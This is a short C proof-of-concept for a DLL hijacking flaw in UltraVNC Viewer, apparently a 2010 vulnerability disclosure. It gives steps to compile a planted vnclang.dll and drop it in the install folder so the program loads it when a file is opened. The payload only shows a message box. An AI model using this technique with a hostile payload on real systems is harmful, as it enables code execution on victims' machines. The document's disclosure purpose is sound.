/*
====================================================================
UltraVNC Viewer - Connection 105 DLL Hijacking Exploit (vnclang.dll) 
====================================================================

$ Program: UltraVNC Viewer
$ Version: Connection 105
$ Download: http://www.uvnc.com/
$ Date: 2010/10/08
 
Found by Pepelux <pepelux[at]enye-sec.org>
http://www.pepelux.org
eNYe-Sec - www.enye-sec.org

Tested on: Windows XP SP2 && Windows XP SP3

How  to use : 

1> Compile this code as vnclang.dll
	gcc -shared -o vnclang.dll thiscode.c
2> Move DLL file to the directory where UltraVNC is installed
3> Open any file recognized by UltraVNC
*/


#include <windows.h>
#define DllExport __declspec (dllexport)
int mes()
{
  MessageBox(0, "DLL Hijacking vulnerable", "Pepelux", MB_OK);
  return 0;
}
BOOL WINAPI  DllMain (
			HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
			{mes();}
